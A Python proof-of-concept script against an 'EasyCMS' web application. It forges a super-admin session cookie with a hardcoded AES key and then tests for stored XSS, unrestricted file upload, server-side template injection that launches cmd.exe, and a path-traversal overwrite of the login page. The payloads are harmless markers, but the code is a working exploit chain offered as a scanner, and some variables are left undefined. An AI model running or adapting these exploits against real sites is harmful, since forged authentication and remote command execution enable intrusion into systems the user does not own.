# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from pkcs7 import PKCS7Encoder
import base64
import requests
import json
import logging
import os
import sys

host = ''
headers = {'Cookie':''}

class AESEncryptor(object):
 
    def __init__(self, key, iv, k=16):
        self.key = base64.b64decode(key)
        self.iv = iv
        self.k = k
 
    def encrypt(self, text):
        key = self.key
        iv = self.iv
        aes = AES.new(key, AES.MODE_CBC, iv)
        pad_text = PKCS7Encoder().encode(text)
        cipher_text = aes.encrypt(pad_text)
        return base64.b64encode(cipher_text)
 
    def decrypt(self, text):
        key = self.key
        iv = self.iv
        aes = AES.new(key, AES.MODE_CBC, iv)
        decode_text = base64.b64decode(text)
        pad_text = aes.decrypt(decode_text)
        return PKCS7Encoder().decode(pad_text)
        
        
def fake_cookie():
    ase = AESEncryptor('QaP1AF8utIarcBqdhYTZpVGbiNQ9M6IL','\x00'*16)
    userinfo = '{"Id":"138030650765382","LoginName":"test","UserName":"test","IsSuper":true,"Gender":0,"RoleId":"0","RoleName":null,"RoleCode":null,"DeptId":0,"DeptName":"","Phone":"18888888888","Email":"","Avatar":"/upfiles/heads/60dc36b5006066164021cbf6.png"}'
    enc = ase.encrypt(userinfo)
    return enc
    
def xss():
    save_url = host + '/Cms/Content/Save'
    list_url = host + '/cms/content/GetData'
    content_datas = {'id':'0','channel_id':'18','title':'test','cover_image':'','summary':'test','content':'<script>console.log(\'easycms_poc\');</script>','author':'','source':'','hit_count':'1','content_status':'1','content_href':'','publish_time':'2021-06-24+14%3A20%3A52','is_top':'','is_recommend':''}  
    
    requests.post(save_url, data = content_datas, headers = headers)
    resp = requests.post(list_url, data = list_datas, headers = headers)
    content_list = json.loads(resp.text)['rows']
    for content in content_list:
        if '<script>console.log(\'easycms_poc\');</script>' in content['content']:
            print('[+]XSS vulnerability exists.')
            return
    print('[-]XSS vulnerability don\'t exists.')
    
def upload1():
    upload_url = host + '/api/BdUpload/index?action=someaction&encode=utf-8'
    with open('easycms_poc.html','w+') as f:
        f.write('<h1>test</h1>')
        f.seek(0)
        files = {'upfile':f}
        resp = requests.post(upload_url, files = files, proxies = proxies)
        result = json.loads(resp.text)
        resp = requests.get(host + result['url'].replace('\\','/'))
        if '<h1>test</h1>' in resp.text:
            print('[+]Upload1 vulnerability exists.')
        else:
            print('[-]Upload1 vulnerability don\'t exists.')
    os.remove(f.name)

def upload2():
    upload_url = host + '/api/upload/SaveChunkFile'
    upload_data = {'action':'', 'guid':'easycms', 'name':'poc.html', 'chunk':'poc'}
    files = {'file':'<h1>test</h1>'+'a'*5*1024*1024}
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    resp = requests.post(upload_url, data = upload_data, files = files, proxies = proxies, headers = headers)
    resp = requests.get(host + '/UploadTemp/easycms/poc.html')
    if '<h1>test</h1>' in resp.text:
        print('[+]Upload2 vulnerability exists.')
    else:
        print('[-]Upload2 vulnerability don\'t exists.')
        
def ssti():
    url = host + '/cms/TemplateCode/Save'
    template_content = '''<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0">
    <meta name="applicable-device" content="pc,mobile">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>{$site.site_title}</title>
    <meta name="Keywords" content="{$site.site_keyword}" />
    <meta name="Description" content="{$site.site_description}" />
    <link rel="stylesheet" href="/static/layui/css/layui.css">
    <link rel="stylesheet" href="/static/css/index.css">
    <vt:function var="path" method="GetFullPath" type="System.IO.Path" args="wwwroot"/>
    <vt:set var="path" value="$path" value="tmp.txt" format="{0}\{1}"/>
    <vt:set var="cmd" value="echo easycms_poc"/>
    <vt:set var="cmd" value="$cmd" value="$path" format="/c {0} > {1}"/>
    <vt:function var="process" method="Start" type="System.Diagnostics.Process" args="cmd.exe" args="$cmd"/>
    <vt:output file="$path" />
</head>'''
    data = {'id':'11','pid':'5','template_name':'header脚本','template_file':'header.html','template_content':template_content}
    resp = requests.post(url, data = data, headers = headers)
    
    url = host + '/channel/1'
    resp = requests.get(url)
    if 'easycms_poc' in resp.text:
        print('[+]SSTI vulnerability exists.')
    else:
        print('[-]SSTI vulnerability don\'t exists.')
    
def overwrite():
    url = host + '/cms/TemplateCode/Save'
    template_content = '''<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>EasyCMS后台管理</title>
    <link href="~/ui/css/login.css" rel="stylesheet" type="text/css" />
    <script>
        localStorage.removeItem("lockScreen");
        if (window.top !== window.self) { window.top.location = window.location; }
    </script>
</head>
<body>
    <div style="text-align:center;">
        <p></p>
    </div>
    <div class="login_box">
        <div class="login_l_img"><img src="/ui/images/login-img.png" /></div>
        <div class="login">
            <div class="login_logo"><a href="#"><img src="/ui/images/login_logo.png" /></a></div>
            <div class="login_name">
                <p>EasyCMS管理系统</p>
            </div>
            <form method="post" action="/login/LoginOn">
                <input name="uname" id="uname" type="text" value="" placeholder="用户名" required >
                <input name="pwd" type="password" id="pwd" placeholder="密码" required/>
                <input value="登录" style="width:100%;" type="submit">
                <div class="text-center p-t-8 p-b-31" style="color: red;">
                    @Html.ValidationMessage("err")
                </div>
            </form>
        </div>
        <div class="copyright">EasyCMS 版权所有© 2019-2021</div>
    </div>

    <!--统计代码，可删除-->
    @(7*7*7)
</body>
</html>'''
    data = {'id':'0','pid':'5','template_name':'test','template_file':'../../../Views/Login/Index.cshtml','template_content':template_content}
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    resp = requests.post(url, data = data, headers = headers, proxies = proxies)
    
    url = host + '/login/index'
    resp = requests.get(url)
    if str(7**3) in resp.text:
        print('[+]Overwrite vulnerability exists.')
    else:
        print('[-]Overwrite vulnerability don\'t exists.')

def main():
    if len(sys.argv) != 2:
        print('Usage: {} url'.format(sys.argv[0]))
        return
    host = sys.argv[1]
    headers['Cookie'] = 'easycms_user='+fake_cookie()
    xss()
    upload1()
    upload2()
    ssti()
    overwrite()
    
if __name__ == '__main__':
    main()
    